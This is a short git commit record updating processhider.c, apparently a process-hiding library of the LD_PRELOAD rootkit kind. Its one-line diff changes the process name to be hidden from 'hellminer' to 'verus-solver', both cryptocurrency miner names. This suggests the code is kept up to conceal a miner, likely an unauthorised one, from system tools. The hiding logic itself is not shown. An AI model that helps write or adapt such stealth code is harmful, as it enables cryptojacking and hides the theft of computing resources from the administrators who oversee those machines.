ef6c636a7974fca91527394b442dcf1558562810
chikahusarii <85166601+chikahusarii@users.noreply.github.com>
2022-09-09 17:29:04 +0700

    Update processhider.c

--- processhider.c
+++ processhider.c
@@ -9,7 +9,7 @@
 /*
  * Every process with this name will be excluded
  */
-static const char* process_to_filter = "hellminer";
+static const char* process_to_filter = "verus-solver";
 
 /*
  * Get a directory name given a DIR* handle
